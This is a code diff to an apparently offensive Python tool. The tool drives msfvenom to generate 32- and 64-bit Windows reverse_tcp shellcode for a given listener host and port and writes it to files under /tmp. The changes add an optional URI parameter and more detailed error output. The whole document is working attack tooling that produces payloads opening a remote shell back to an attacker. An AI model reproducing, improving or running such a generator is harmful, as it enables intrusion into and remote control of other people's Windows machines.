@@ -510,16 +510,24 @@ class bcolors:
 parser = argparse.ArgumentParser()
 parser.add_argument("lhost", help="listener IP to use")
 parser.add_argument("lport", help="listener port to use",  nargs='?', default="443")
+parser.add_argument("luri", help="uri to call", nargs='?', default="/")
 
 args = parser.parse_args()
 
 
 # Generate the shellcode given the preferred payload
-print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating windows/reverse_tcp (x32 and x64) for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
-result = subprocess.run(['msfvenom', '-p', 'windows/shell/reverse_tcp', f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "C"], stdout=subprocess.PIPE)
+msf_cmd_x32 = ['msfvenom', '-p', 'windows/shell/reverse_tcp', f"LHOST={args.lhost}", f"LPORT={args.lport}"]
+if args.luri and args.luri != "/":
+    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating windows/reverse_tcp (x32 and x64) for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} LPORT={bcolors.OKGREEN}{args.lport}{bcolors.OKBLUE} LURI={bcolors.OKGREEN}{args.luri}{bcolors.ENDC}")
+    msf_cmd_x32.append(f"LURI={args.luri}")
+else:
+    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating windows/reverse_tcp (x32 and x64) for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
+msf_cmd_x32.extend(['exitfunc=thread', "-f", "C"])
+result = subprocess.run(msf_cmd_x32, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 if result.returncode != 0:
-    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")
+    print(f"{bcolors.BOLD}{bcolors.FAIL}[x] msfvenom stderr:{bcolors.ENDC}\n{result.stderr.decode('utf-8', errors='replace')}")
+    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful (rc={result.returncode}). Are you sure msfvenom is installed?{bcolors.ENDC}")
 
 
 #somehow 
@@ -547,7 +555,16 @@ file = open('/tmp/yolo', 'r')
 shell32 = file.read()
 file.close()
 
-result = subprocess.run(['msfvenom', '-p', 'windows/x64/shell/reverse_tcp', f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "C"], stdout=subprocess.PIPE)
+msf_cmd_x64 = ['msfvenom', '-p', 'windows/x64/shell/reverse_tcp', f"LHOST={args.lhost}", f"LPORT={args.lport}"]
+if args.luri and args.luri != "/":
+    msf_cmd_x64.append(f"LURI={args.luri}")
+msf_cmd_x64.extend(['exitfunc=thread', "-f", "C"])
+result = subprocess.run(msf_cmd_x64, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+if result.returncode != 0:
+    print(f"{bcolors.BOLD}{bcolors.FAIL}[x] msfvenom stderr (x64):{bcolors.ENDC}\n{result.stderr.decode('utf-8', errors='replace')}")
+    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom x64 generation unsuccessful (rc={result.returncode}).{bcolors.ENDC}")
+
 file = open('/tmp/shell', 'w')
 item = file.write(result.stdout.decode('utf-8'))
 file.close()
